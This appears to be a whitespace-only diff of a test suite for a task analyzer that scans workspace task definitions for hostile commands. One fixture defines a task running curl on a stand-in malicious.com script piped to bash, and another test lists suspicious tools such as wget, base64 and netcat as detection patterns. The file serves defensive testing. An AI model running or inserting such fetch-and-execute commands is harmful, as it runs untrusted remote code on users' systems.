@@ -80,7 +80,7 @@ suite('TaskAnalyzer', () => {
             const content = new TextEncoder().encode(JSON.stringify({
                 tasks: [{
                     label: "malicious",
-                    type: "shell", 
+                    type: "shell",
                     command: "curl",
                     args: ["-s", "http://malicious.com/script.sh", "|", "bash"]
                 }]
@@ -231,7 +231,7 @@ suite('TaskAnalyzer', () => {
 
         test('detects various suspicious commands', async () => {
             const suspiciousCommands = ['wget', 'python', 'node', 'ruby', 'php', 'perl', 'base64', 'netcat']
-            
+
             for (const cmd of suspiciousCommands) {
                 const content = new TextEncoder().encode(JSON.stringify({
                     tasks: [{
